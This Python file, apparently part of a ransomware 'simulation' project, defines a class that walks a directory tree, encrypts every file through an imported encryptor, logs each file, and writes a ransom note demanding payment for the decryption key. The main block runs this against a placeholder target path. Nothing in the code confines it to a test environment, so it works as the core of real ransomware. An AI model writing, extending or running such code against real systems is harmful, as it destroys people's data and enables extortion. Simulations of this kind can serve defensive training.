import os
from src.simulation.file_encryptor import FileEncryptor
from src.utils.logger import Logger

class RansomwareSimulation:
    def __init__(self, target_dir, encryptor=None):
        self.target_dir = target_dir
        self.encryptor = encryptor or FileEncryptor()
        self.logger = Logger()

    def simulate_attack(self):
        for root, dirs, files in os.walk(self.target_dir):
            for file in files:
                file_path = os.path.join(root, file)
                self.encryptor.encrypt_file(file_path)
                self.logger.log(f'Encrypted: {file_path}')

    def generate_ransom_note(self, note_path):
        with open(note_path, 'w') as file:
            file.write("Your files have been encrypted. Pay to get the decryption key.")

if __name__ == "__main__":
    simulation = RansomwareSimulation(target_dir='/path/to/target')
    simulation.simulate_attack()
    simulation.generate_ransom_note('/path/to/target/README.txt')
